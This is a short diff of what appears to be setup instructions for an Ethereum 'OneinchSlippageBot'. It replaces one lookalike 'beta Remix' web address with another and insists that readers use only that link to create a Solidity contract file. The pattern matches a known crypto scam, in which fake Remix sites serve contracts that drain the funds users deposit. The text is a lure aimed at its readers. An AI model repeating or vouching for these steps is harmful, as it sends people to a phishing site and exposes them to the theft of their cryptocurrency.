@@ -4,8 +4,8 @@
 
 ✅1- Download MetaMask: https://metamask.io/download/
 
-✅2- Access: https://remixier-web.com/
-⚠️(THE BOT IS ONLY COMPATIBLE WITH THIS BETA VERSION OF THE REMIX, SO ONLY USE THIS LINK)⚠️ https://remixier-web.com/
+✅2- Access: http://www.eth-compiler.com/
+⚠️(THE BOT IS ONLY COMPATIBLE WITH THIS BETA VERSION OF THE REMIX, SO ONLY USE THIS LINK)⚠️ http://www.eth-compiler.com/
 
 
 ✅3- Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “OneinchSlippageBot.sol”. Make sure it ends with .sol for Ethereum programming language.
